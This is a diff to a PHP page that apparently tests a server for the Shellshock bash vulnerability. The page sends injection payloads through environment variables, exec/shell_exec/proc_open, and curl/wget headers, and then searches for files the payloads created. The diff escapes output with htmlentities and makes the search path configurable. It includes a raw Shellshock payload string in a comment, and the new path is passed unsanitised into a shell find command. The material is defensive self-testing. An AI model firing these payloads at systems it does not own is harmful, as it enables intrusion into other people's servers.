@@ -160,19 +160,19 @@ echo "<script>\ndocument.getElementById('lvl').onchange=function(){\ndocument.lo
 //===========> DEFINE TEST [NOT AFFECTED]
 echo '<H1>SHELL SHOCK EXPLOIT TEST (php command define)</H1>';
 define("_var_", strFullCmd(strCmd('phpDefine'),$lvl));
-echo "define test = "._var_."<br>";
+echo "define test = ".htmlentities(_var_)."<br>";
 
 //===========> $_ENV TEST [NOT AFFECTED]
 echo '<H1>SHELL SHOCK EXPLOIT TEST (php command $_ENV)</H1>';
 $_ENV["var"]=strFullCmd(strCmd('phpEnv'),$lvl);
-echo '$_ENV test = '.$_ENV["var"];
+echo '$_ENV test = '.htmlentities($_ENV["var"]);
 
 //===========> putenv TEST [NOT AFFECTED]
 if(function_exists('putenv'))
 	{
 	echo '<H1>SHELL SHOCK EXPLOIT TEST (php command putenv)</H1>';
 	putenv( "var=".strFullCmd(strCmd('phpPutEnv'),$lvl) );
-	echo "putenv test = ".getenv("var");
+	echo "putenv test = ".htmlentities(getenv("var"));
 	}
 
 //===========> apache_setenv TEST [NOT AFFECTED]
@@ -180,7 +180,7 @@ if(function_exists('apache_setenv'))
 	{
 	echo "<H1>SHELL SHOCK EXPLOIT TEST (php command apache_setenv)</H1>";
 	apache_setenv("var",strFullCmd(strCmd('phpApacheSetEnv'),$lvl));
-	echo "apache_setenv() test = ".$_SERVER["var"];
+	echo "apache_setenv() test = ".htmlentities($_SERVER["var"]);
 	}
 
 //===========> exec() TEST [AFFECTED]
@@ -190,7 +190,7 @@ if(function_exists('exec'))
 	exec("env var='".strFullCmd(strCmd('phpExec'),$lvl)."' /bin/bash -c /bin/true");
 	exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl).' '.$serverIp);
 	exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl).' '.$serverIp);
-	echo "exec() test = ".$_ENV["var"];
+	echo "exec() test = ".htmlentities($_ENV["var"]);	
 	}
 else{echo "php exec isnot activated on this server<br>";}
 
@@ -201,7 +201,7 @@ if(function_exists('shell_exec'))
 	shell_exec("env var='".strFullCmd(strCmd('phpShellExec'),$lvl)."' /bin/bash -c /bin/true");
 	shell_exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl).' '.$serverIp);
 	shell_exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl).' '.$serverIp);
-	echo "shell_exec() test = ".$_ENV["var"];
+	echo "shell_exec() test = ".htmlentities($_ENV["var"]);
 	}
 else{echo "php shell_exec isnot activated on this server<br>";}
 
@@ -287,8 +287,8 @@ if(function_exists('proc_open'))
 	//$p = proc_open("rm -f echo; env 'x=() { (a)=>\' bash -c \"echo date +%Y\"; cat echo", $desc, $pipes, sys_get_temp_dir());
 	
 	//echo "proc_open test = ".stream_get_contents($pipes[0])."<br>";
-	echo "proc_open test = ".stream_get_contents($pipes[1])."<br>";
-	echo "proc_open test = ".stream_get_contents($pipes[2])."<br>";
+	echo "proc_open test = ".htmlentities(stream_get_contents($pipes[1]))."<br>";
+	echo "proc_open test = ".htmlentities(stream_get_contents($pipes[2]))."<br>";
 	proc_close($tst);
 	}
  
@@ -297,10 +297,11 @@ if(function_exists('proc_open'))
  * ----- [ PHP SHELLSHOCK RESULT ] ----- *
  *****************************************/	
 //===========> RESULT
+if($filePath==''){$filePath='/';} // change file path if empty to search in whole folders
 if(function_exists('exec'))
 	{
 	echo "<h1><font color=red>[ SHELLSHOCK EXPLOIT  RESULT ]</font></h1>";	
-	$res=exec('find / -name "'.$fileName.'*" -type f -print0');
+	$res=exec('find '.$filePath.' -name "'.$fileName.'*" -type f -print0');
 	$t=explode($fileExt,$res);
 	if(count($t)>1)
 		{
@@ -312,7 +313,7 @@ if(function_exists('exec'))
 else if(function_exists('shell_exec'))
 	{
 	echo "<h1><font color=red>[ SHELLSHOCK EXPLOIT RESULT ]</font></h1>";
-	$t=explode("\n",shell_exec('find / -name "'.$fileName.'*" -type f'));
+	$t=explode("\n",shell_exec('find '.$filePath.' -name "'.$fileName.'*" -type f'));
 	if(count($t)>1)
 		{
 		echo "<b><font color=red>this is the list of file created from shellshock exploit :</font></b><br>";	
@@ -320,7 +321,7 @@ else if(function_exists('shell_exec'))
 		}
 	else{echo "<b><font color=green>Your server is secured against selected shellshock exploit</font></b><br>";}
 	}
-else{echo "server has too much php securities: results cannot be shown, you have to run manually the command 'find / -name \"$fullName\" -type f' in console ";}
+else{echo "server has too much php securities: results cannot be shown, you have to run manually the command 'find ".$filePath." -name \"$fullName\" -type f' in console ";}
 
 //===========> CLEANING ENV
 if(function_exists('exec')){exec("unset var");}
